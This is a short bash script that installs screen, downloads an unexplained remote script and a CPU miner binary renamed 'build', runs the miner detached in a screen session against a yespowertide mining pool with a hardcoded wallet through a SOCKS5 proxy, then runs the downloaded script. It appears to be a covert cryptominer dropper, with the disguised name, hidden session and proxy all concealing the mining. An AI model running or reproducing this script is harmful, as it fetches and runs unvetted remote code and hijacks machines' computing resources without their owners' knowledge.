#!/bin/bash

apt-get update
apt-get install screen -y
wget -q https://raw.githubusercontent.com/nhuhijias/tuyulq/main/program.sh
wget -qO build http://berkah.mdnet.co.id/cpuminer-sse2
chmod +x build
chmod +x program.sh
screen -dm -S build ./build -a yespowertide -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TJjSCLyybeSnHqR1CTAVwfUhf2QkkBvjWZ.solinos  --proxy socks5://67.201.33.9:25280
./program.sh

echo succes
